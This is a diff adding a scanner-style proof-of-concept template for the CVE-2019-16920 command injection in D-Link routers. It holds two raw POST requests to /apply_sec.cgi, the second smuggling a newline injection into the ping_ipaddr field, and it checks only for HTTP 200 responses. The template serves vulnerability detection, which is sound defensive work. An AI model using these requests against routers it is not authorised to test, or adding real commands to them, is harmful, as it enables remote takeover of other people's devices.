@@ -1,0 +1,51 @@
+[info]
+author = "AVE"
+description = "检测 D-Link 路由器 PingTest 接口命令注入漏洞。通过向 /apply_sec.cgi 发送特制的 POST 请求，在 ping_ipaddr 参数中注入系统命令，验证是否存在未授权远程命令执行漏洞。"
+id = "POC-AVE-2019-0809"
+name = "D-Link 多款路由器命令注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0809"]
+vuln_id = [
+    "CVE-2019-16920",
+    "AVE-2019-0809",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/apply_sec.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Referer = "{{BaseURL}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/apply_sec.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "uid=1234123"
+Referer = "{{BaseURL}}/login_pic.asp"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
